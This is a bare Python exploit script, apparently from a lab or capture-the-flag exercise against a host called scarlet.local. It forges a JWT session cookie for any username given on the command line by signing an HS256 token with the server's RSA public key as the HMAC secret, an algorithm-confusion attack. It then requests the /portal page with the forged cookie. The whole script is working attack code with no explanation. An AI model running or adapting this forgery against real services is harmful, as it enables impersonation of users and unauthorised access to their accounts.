#!/usr/bin/python
import sys
import hmac
import hashlib
import base64
import json
import requests

username = str(sys.argv[1])
secret_key = "-----BEGIN PUBLIC KEY-----\nMIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEA3dFqq0OaPITIrCHAN86q\nGYIbNAJYlyodym1PNrklp0pD0ddhit7omVeVY6JYq+BDHaMgS6mBr20ecAf7oBUA\nCAKgnAkZpUtUY0p5JMe5jEUbVVnZylwawiJP8MsU+F+vRf3UDSiJIRAff+rajdxb\ndubApQakRdy4HfxMFTUGJEDm91YpjHCpLXslXub5pWZtA+4QeKzWCMO70PwWcEYA\nYv0Gif0yR4hGKm5ugI2KzCT1CbJAE++ZHryR0oMHjFIEPwFjDqdcQk0Z+nuDlmJL\nvQdA2Y7O6k7OJLXbRvDH97+L4ouPcxj2gS+x25mlFBmiMZUXnj/ZqD2DGz5Yq+hB\nf4DRAALZAv5zsN2uiPjU98IAm4jdqTw+yUxUkdX5bDomPF1jFvdWygsY8Yo5J3pk\nxWhMvULam5kfs1Cu+RHR3fu9m7xi7QILkWVyOd8B0qfixtpGE20o6/VhuAS9rPBH\nAMih9//ztpKStW0NNhtfYfsl9xenqt1E9GVr3js/OUYIcC4ZOLZT4ulluL0gAGWu\nniDUq1os9iR2HzYBNOwlw77bipjACB0mxZE7WE2fQEtLnQ/K5yDQTQM4tr3r8X6L\nRTAP0iwG56rcYiQtmM/shSocenRr228os666rQwFnxT7jugl0sRlsFqZNzgXWDn/\n51qez+VrhIb63VuDyVKewPcCAwEAAQ==\n-----END PUBLIC KEY-----\n"
header = json.dumps({"alg":"HS256","typ":"JWT"}).encode()

payload = json.dumps({
    "username":username,
    "iat":1626284638
    }
).encode()

b64_header = base64.urlsafe_b64encode(header).decode().rstrip("=")
b64_payload = base64.urlsafe_b64encode(payload).decode().rstrip("=")

signature = hmac.new(
    key=secret_key.encode(),
    msg=f'{b64_header}.{b64_payload}'.encode(),
    digestmod=hashlib.sha256
).digest()

JWT = f'{b64_header}.{b64_payload}.{base64.urlsafe_b64encode(signature).decode()}'

COOKIES = {
    'session': JWT.rstrip("=")
    }

headers = {
    'Host': 'scarlet.local'
}
rese = requests.get("http://scarlet.local/portal", cookies = COOKIES, headers=headers)
print(rese.text)

